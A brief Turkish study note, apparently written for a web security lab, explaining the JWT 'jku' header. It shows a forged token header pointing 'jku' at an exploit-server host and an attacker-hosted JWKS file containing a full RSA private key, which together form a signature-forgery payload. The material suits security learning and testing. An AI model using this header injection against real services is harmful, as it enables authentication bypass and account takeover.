
JWT’nin `header` kısmına eklenebilen `jku` (JWK Set URL) alanı, doğrulamada kullanılacak **JSON Web Key Set (JWKS)** belgesinin **URL adresini** belirtir.

`jku` header kullanılarak hangi sunucudan gerekli rsa public key inin alınacağı belirtilebilir. Header başlığında bulundurulur ve
```JSON
{  
    "kid": "mr-rsa",  
    "alg": "RS256",  
    "jku": "https://exploit-0a6a004e04b526b183a30eeb01bb000d.exploit-server.net/jwks.json"  
}
```
şeklinde belirtilir.

`kid` kullanılarak sunucudan çekilen hangi keyin kullanılacağına karar verilebilir.

sunucu bu şekilde bir json kosyası ile `mr-rsa` kid ile belirtilmiş şifreyi alabilir.
```JSON
{
    "keys": [
			{
			    "p": "yXvPOYtnQfthyRM-s97bvOUJBA5uL76g3w1AUXYR54YDv3aLsszaxxcxAw1Y_gG9hHhEbDVdEdxY2LIXRS4Cbn4G2-uFGEnSVi2oBxSiklmFbktwfrMU7ZTtgZGHJIDsf7YXIr1jcBHt99qNzIL6yXN_p6s-ajp2SuRDSU7zLAs",
			    "kty": "RSA",
			    "q": "umrf1ARZLa5pVTpb0AKwgkJrzElQ94SMUgyfuwN18yoEIUOZEJYbCW0P4GGF-eFBb_ZWf4pYi8_hH7Ys9iX6-zyHNcrruvLSdNodA5xgz7AvzpXZa79CrYLkkvrw3huHy2AcphH5Gzl162RVP8lmvpH9tr7P22U8PH6-5t0jbI8",
			    "d": "F8h1xhJxMLy1_7laCydj6s1EWv-hZSGhrMAP9A_NrL4zBI9V8FI7QkRnLd7upasdubmSQol8kg8gz_zn72EzbxMXJR6D2zLKSwtLdNwGeR_ZDnHxyDSEQ-O5c5f7H9_ZxfQ32XPzreAssKKHjTIiK5Q6aEJlDdAop8ULCizOciLGunK5DGYkoNWGchZHngV2eJ_32AM4ZBd644_yyLjHlv-jmJ1bXf5ejdASXROWs-3wdjhwZ1joIJZrgVaEwO-VonH_J_CDTsYAyDf4NwoDJAMHbKWc3gpiPgD_FD2SJI9_4HfR5gXBmR7bWpVKCM_-aeL1v8wG1S50fYWhlTDfOw",
			    "e": "AQAB",
			    "kid": "mr-rsa",
			    "qi": "I-mKemJ4t_MJZlYpjFaiE42fbP3MeVxHx1sUxLa6AK9yXsYx6Wfgp6Bka6SlcRiuRKcHIqqgH-FWWdH60eSbtn4GqbJfElwwjSHssD5QSfxa80g7P7sCVKXQ7ZyRLQikJHoZMRHbNPqfPbQcd0sNUw8G7CAjaVksGtFBymbgDZ4",
			    "dp": "Ah16n3AHNXoeHK5HCjxcsi71WUWNgpLNvYm2EyTaK0QM5gWokcf0xAJKUW3icUgzZSCeF0S4JWfaxuuXsvI4tFA-YjCmxQqBWsY_7VMaIc8ux2mjVLEslxHpLGMKuCdiVDTlKUgzswl9Jgz1UCBP4a2EuY3iqdrTQxYCXtKlWuE",
			    "dq": "l45GFNfILNRsPGcqt61IFU6s1zQQCHuRnS84OVGx9hSFsQmFCrAOoRYy3yhKRQH2MnFil2RBYsGJ9D8mxKPSLali_7_O8Hlz0p51EjdzmcZSx7CaR_gB3JDbBgfQBbL6LsUf5YAdNx37GXnDuQ0jY_HLBGSTFnpyg3hD-et1Xk8",
			    "n": "krgR_VSTmgRUyRotJZctcMTO6F8-LYuCBwGMEd_fJOb-ORh1fcHLT4zAmA7bRx49ZYrD5C9zWx4VKRFDlp_0cJijlDpKky3bfP72vPv-61Hsgx1YHb5YeMbJ5Y0k-WJ3TVc9hmxYe2Ay6dj9mH5aJFMWgbx8fifYMG3Cdc8fAAX4UlaaWq543jJ6uEbUU2kZrCwDtMbWkTzCIg1omoilGfgPYtM6lNLcufUzzUitxnSxUwXtzdaLaB2unWbySZNr-HPdlpNpOgx2QrfiBvA60d21Q3BW8w2Y3H-PcJFGDR0VN0fnEpv-7GiiX6m5DlGJOTMwF842OwNIpfdoNOs-JQ"
			}
    ]
}
```